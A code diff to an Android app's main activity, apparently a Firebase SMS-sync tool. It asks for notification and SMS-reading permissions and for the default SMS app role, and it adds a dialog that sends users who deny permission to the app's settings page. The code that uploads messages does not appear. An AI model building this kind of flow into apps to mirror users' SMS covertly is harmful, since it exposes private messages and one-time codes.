@@ -1,12 +1,15 @@
 package com.vplan.rxtprob
 
 import android.Manifest
+import android.app.AlertDialog
 import android.app.role.RoleManager
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.provider.Telephony
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -30,11 +33,11 @@ class MainActivity : AppCompatActivity() {
 
         smsSync = SmsSyncService(this)
 
-        // 🔹 Step 1: Try notification permission first (optional)
+        // 🔹 Step 1 → প্রথমে notification permission চাও
         requestNotificationPermission()
     }
 
-    // 🔸 Step 1 → Notification permission (optional)
+    // 🔸 Step 1 → Notification Permission
     private fun requestNotificationPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             val granted = ContextCompat.checkSelfPermission(
@@ -49,16 +52,14 @@ class MainActivity : AppCompatActivity() {
                     REQUEST_NOTIFICATION_PERMISSION
                 )
             } else {
-                // Already granted → move to SMS permission
-                requestSmsPermission()
+                requestSmsPermission() // ✅ যদি notification আগেই allow থাকে
             }
         } else {
-            // For older Android versions, skip notification and go to SMS
             requestSmsPermission()
         }
     }
 
-    // 🔸 Step 2 → SMS permission (must be granted for sync)
+    // 🔸 Step 2 → SMS permission
     private fun requestSmsPermission() {
         val permissions = arrayOf(
             Manifest.permission.READ_SMS,
@@ -76,7 +77,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // 🔸 Step 3 → Default SMS app check
+    // 🔸 Step 3 → Default SMS app request
     private fun ensureDefaultSmsApp() {
         val myPackageName = packageName
 
@@ -100,7 +101,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // ✅ Step 4 → Start Firebase SMS Sync
+    // 🔹 Step 4 → Start Firebase SMS Sync
     private fun startSmsSync() {
         try {
             Toast.makeText(this, "✅ SMS Sync Started", Toast.LENGTH_SHORT).show()
@@ -112,7 +113,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    // 🔸 Handle Permission Results
+    // 🔸 Permission result handle
     override fun onRequestPermissionsResult(
         requestCode: Int,
         permissions: Array<out String>,
@@ -121,25 +122,44 @@ class MainActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
         when (requestCode) {
-
-            // Notification permission (optional)
             REQUEST_NOTIFICATION_PERMISSION -> {
-                // আমরা SMS permission এ চলে যাব, allow হোক বা না হোক
+                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                    Toast.makeText(this, "🔔 Notification Allowed", Toast.LENGTH_SHORT).show()
+                } else {
+                    showPermissionDialog("Notification permission denied. You can enable it later from settings.")
+                }
+                // ✅ Notification allow হোক বা না হোক → SMS permission next
                 requestSmsPermission()
             }
 
-            // SMS permission (must)
             REQUEST_SMS_PERMISSION -> {
                 if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                     ensureDefaultSmsApp()
                 } else {
-                    Toast.makeText(this, "❌ SMS Permission Denied", Toast.LENGTH_SHORT).show()
+                    showPermissionDialog("SMS permissions are required to sync messages.")
                 }
             }
         }
     }
 
-    // 🔸 Handle default SMS app result
+    // 🔸 Step 5 → Show Alert Dialog (non-blocking)
+    private fun showPermissionDialog(message: String) {
+        AlertDialog.Builder(this)
+            .setTitle("Permission Info")
+            .setMessage(message)
+            .setCancelable(true)
+            .setPositiveButton("Open Settings") { _, _ ->
+                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                intent.data = Uri.fromParts("package", packageName, null)
+                startActivity(intent)
+            }
+            .setNegativeButton("Ignore") { dialog, _ ->
+                dialog.dismiss()
+            }
+            .show()
+    }
+
+    // 🔸 Default SMS result handle
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
         if (requestCode == REQUEST_DEFAULT_SMS_APP) {
